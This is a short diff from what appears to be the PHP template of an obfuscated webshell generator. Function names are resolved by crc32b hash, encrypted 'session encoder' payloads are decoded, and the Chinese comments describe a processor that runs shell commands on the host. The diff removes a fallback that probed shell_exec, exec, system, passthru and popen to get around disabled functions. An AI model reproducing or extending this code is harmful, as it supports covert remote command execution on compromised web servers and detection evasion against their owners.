@@ -1320,13 +1320,11 @@ foreach ($_fn as $_n) {
     $_h = hash('crc32b', $_n);
     if (isset($_t[$_h])) $_g[$_t[$_h]] = $_n;
 }
-// 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
-// 按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
-// proc_open 需 3 参数不兼容单参数调用，排除）
-foreach (array('shell_exec', 'exec', 'system', 'passthru', 'popen') as $_c) {
-    if (function_exists($_c)) { $_g[0] = $_c; break; }
-}
-
+// 注意：不要在此覆盖 $_g[0]。session 模板的 unpack/pack 由各编码器通过
+// 符号表把 $_g[0]/$_g[1] 绑定为各自需要的解码 / 加解密函数；
+// 早期这里有一段「执行器降级」会把 $_g[0] 改成命令函数，导致解包时
+// 实际把密文当命令执行并返回空 —— 7 个 session 编码器因此全部不可用。
+// 处理器 run() 内部直接用命令函数，不需要这份降级。
 function __PREFIX__dec($hex, $key) {
     $out = '';
     $n = strlen($hex) / 2;
